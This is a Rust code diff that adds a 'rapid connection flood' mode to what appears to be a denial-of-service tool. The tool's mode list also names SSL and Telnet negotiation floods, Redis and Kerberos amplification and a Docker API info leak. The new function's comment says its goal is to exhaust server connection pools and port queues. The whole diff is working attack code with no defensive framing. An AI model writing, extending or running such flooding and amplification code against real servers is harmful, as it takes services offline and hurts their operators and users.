@@ -23,6 +23,7 @@ pub enum TcpMode {
     SslReneg,
     TelnetNeg,
     GenericConnect,
+    TcpConnectionFlood,
     RedisSlaveRead,
     DockerApi,
     KerberosAsReq,
@@ -55,6 +56,7 @@ impl TcpMode {
             TcpMode::SslReneg => "SSL renegotiation flood",
             TcpMode::TelnetNeg => "Telnet negotiation flood",
             TcpMode::GenericConnect => "TCP connect flood",
+            TcpMode::TcpConnectionFlood => "Rapid connection flood",
             TcpMode::RedisSlaveRead => "Redis SLAVEOF/MIGRATE amplification",
             TcpMode::DockerApi => "Docker API info leak",
             TcpMode::KerberosAsReq => "Kerberos AS-REQ amplification",
@@ -84,6 +86,7 @@ impl TcpMode {
             TcpMode::SslReneg => 443,
             TcpMode::TelnetNeg => 23,
             TcpMode::GenericConnect => 80,
+            TcpMode::TcpConnectionFlood => 0,
             TcpMode::RedisSlaveRead => 6379,
             TcpMode::DockerApi => 2375,
             TcpMode::KerberosAsReq => 88,
@@ -116,6 +119,7 @@ impl TcpMode {
             "ssl-reneg" => Some(TcpMode::SslReneg),
             "telnet" => Some(TcpMode::TelnetNeg),
             "tcp-connect" | "generic" => Some(TcpMode::GenericConnect),
+            "tcp-connection-flood" | "connection-flood" | "tcp-conn-flood" => Some(TcpMode::TcpConnectionFlood),
             "redis-slave" | "redis-migrate" | "redis-slaveread" => Some(TcpMode::RedisSlaveRead),
             "docker-api" | "docker-info" => Some(TcpMode::DockerApi),
             "kerberos" | "kerberos-as-req" => Some(TcpMode::KerberosAsReq),
@@ -247,6 +251,7 @@ async fn run_protocol(mode: TcpMode, host: &str, port: u16, proxy: Option<&str>)
             TcpMode::SslReneg => ssl_reneg(&mut stream, &mut buf).await?,
             TcpMode::TelnetNeg => telnet_neg(&mut stream, &mut buf).await?,
             TcpMode::GenericConnect => generic_connect(&mut stream, &mut buf).await?,
+            TcpMode::TcpConnectionFlood => connection_flood(&mut stream, &mut buf).await?,
             TcpMode::RedisSlaveRead => redis_slave_read(&mut stream, &mut buf).await?,
             TcpMode::DockerApi => docker_api(&mut stream, &mut buf).await?,
             TcpMode::KerberosAsReq => kerberos_as_req(&mut stream, &mut buf).await?,
@@ -710,6 +715,20 @@ async fn generic_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usiz
     }
 
     Ok((0, recv))
+}
+
+async fn connection_flood(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    // Rapid connect + minimal data exchange, then disconnect
+    // The goal is to exhaust server connection pools and port queues
+    match tokio::time::timeout(Duration::from_secs(2), stream.write_all(b"GET / HTTP/1.0\r\n\r\n")).await {
+        Ok(Ok(_)) => {
+            match tokio::time::timeout(Duration::from_millis(500), stream.read(buf)).await {
+                Ok(Ok(n)) => Ok((0, n)),
+                _ => Ok((0, 0)),
+            }
+        }
+        _ => Ok((0, 0)),
+    }
 }
 
 /// Run TCP load: spawns workers that repeatedly connect and send protocol data
